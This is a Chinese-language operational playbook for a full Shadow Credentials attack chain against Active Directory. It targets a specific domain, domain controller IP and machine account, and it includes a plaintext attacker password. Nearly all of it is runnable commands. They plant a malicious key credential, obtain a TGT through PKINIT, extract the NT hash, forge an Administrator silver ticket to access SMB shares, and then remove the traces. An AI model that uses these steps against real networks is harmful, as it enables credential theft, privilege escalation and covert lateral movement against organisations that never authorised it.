# Shadow Credentials 攻擊鏈實戰手冊 (Kali Linux)

> "Theory and practice sometimes clash. Theory loses. Every single time." - Linus Torvalds

這份指南記錄了在 Kali Linux 上透過代理 (Proxychains) 執行 Shadow Credentials 完整攻擊鏈的標準步驟。所有操作均已驗證可行。

## 0. 前置準備 (Prerequisites)

### 核心變數
- **目標 (Target)**: `EC2AMAZ-V903HM1$`
- **網域 (Domain)**: `sme.local`
- **網域控制器 (DC)**: `10.0.0.206` (必須安裝 KDC 證書)
- **攻擊者 (Attacker)**: `aduser` / `N0viru$123`

### 工具安裝
```bash
# 1. 取得正確的工具 (PKINITtools)
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
pip3 install impacket minikerberos

# 2. 修復 Impacket 依賴問題 (如果遇到 pkg_resources 錯誤)
# sed -i "s/import pkg_resources/# import pkg_resources/g" /path/to/impacket/version.py
# sed -i "s/version = pkg_resources.*/version = '0.10.0'/g" /path/to/impacket/version.py
```

### Kerberos 配置 (`/etc/krb5.conf`)
```ini
[libdefaults]
    default_realm = SME.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    SME.LOCAL = {
        kdc = SME-SWP-W-AD.sme.local
        admin_server = SME-SWP-W-AD.sme.local
    }

[domain_realm]
    .sme.local = SME.LOCAL
    sme.local = SME.LOCAL
```

---

## 1. 植入階段 (The Implant)
**目標**: 修改 `msDS-KeyCredentialLink` 屬性，植入惡意證書。
**EDR 偵測點**: Event 5136 (Directory Service Changes)

```bash
# 列出目標現有的 Key Credentials
proxychains pywhisker -d sme.local -u aduser -p 'N0viru$123' \
  --dc-ip 10.0.0.206 -t EC2AMAZ-V903HM1$ --action list

# 植入新的 Key Credential (生成 PFX)
proxychains pywhisker -d sme.local -u aduser -p 'N0viru$123' \
  --dc-ip 10.0.0.206 -t EC2AMAZ-V903HM1$ --action add

# [重要] 記錄輸出中的 DeviceID、PFX 文件名和密碼
# Output Example:
# [*] KeyCredential generated with DeviceID: <DEVICE_ID>
# [+] Saved PFX (#PKCS12) certificate & key at path: <FILENAME>.pfx
# [*] Must be used with password: <PASSWORD>
```

---

## 2. 認證階段 (The Authentication)
**目標**: 使用植入的 PFX 證書進行 PKINIT 認證，獲取 TGT。
**EDR 偵測點**: Event 4768 (Kerberos TGT Request)

```bash
# 使用 PFX 請求 TGT
# 注意：若遇到 KDC_ERR_PADATA_TYPE_NOSUPP，請確認 DC 是否已安裝 KDC 證書
proxychains python gettgtpkinit.py sme.local/EC2AMAZ-V903HM1\$ \
  -cert-pfx ./<FILENAME>.pfx \
  -pfx-pass '<PASSWORD>' \
  -dc-ip 10.0.0.206 \
  EC2AMAZ-V903HM1.ccache

# 記錄輸出的 AS-REP Key (Session Key)
# Output Example:
# AS-REP encryption key: 8cbd9a052a0e8a4d2310da3df0f98fd4d53b34767dbd9efb84fcad03b89da21c
```

---

## 3. 提取階段 (The Extraction)
**目標**: 利用 TGT 和 Session Key (U2U) 解密 PAC，提取 NTLM Hash。
**EDR 偵測點**: Event 4769 (Kerberos Service Ticket Request)

```bash
# 設置環境變數使用剛獲取的 TGT
export KRB5CCNAME=EC2AMAZ-V903HM1.ccache

# 提取 NTLM Hash
proxychains python getnthash.py sme.local/EC2AMAZ-V903HM1\$ \
  -key <AS-REP_KEY> \
  -dc-ip 10.0.0.206

# Output Example:
# Recovered NT Hash
# 49d2432e37d421bc9896a03608aa1d62
```

---

## 4. 利用階段 (The Lateral Movement)
**目標**: 使用提取的 Hash 偽造 Silver Ticket，訪問目標系統。
**EDR 偵測點**: Event 4624 (Logon) / 5145 (Share Access)

```bash
# 1. 獲取 Domain SID (如果尚未知道)
proxychains lookupsid.py sme.local/aduser:'N0viru$123'@10.0.0.206

# 2. 偽造 CIFS Silver Ticket (以 Administrator 身分)
ticketer.py -nthash <NTLM_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain sme.local \
  -spn cifs/EC2AMAZ-V903HM1.sme.local \
  Administrator

# 3. 訪問目標共享 (驗證權限)
export KRB5CCNAME=Administrator.ccache
proxychains nxc smb EC2AMAZ-V903HM1.sme.local -k --use-kcache
```

---

## 5. 清理階段 (Cleanup)
**原則**: "Leave no trace." 

```bash
# 移除植入的 Key Credential
proxychains pywhisker -d sme.local -u aduser -p 'N0viru$123' \
  --dc-ip 10.0.0.206 -t EC2AMAZ-V903HM1$ --action remove \
  -D <DEVICE_ID>

# 驗證清理結果
proxychains pywhisker -d sme.local -u aduser -p 'N0viru$123' \
  --dc-ip 10.0.0.206 -t EC2AMAZ-V903HM1$ --action list
```
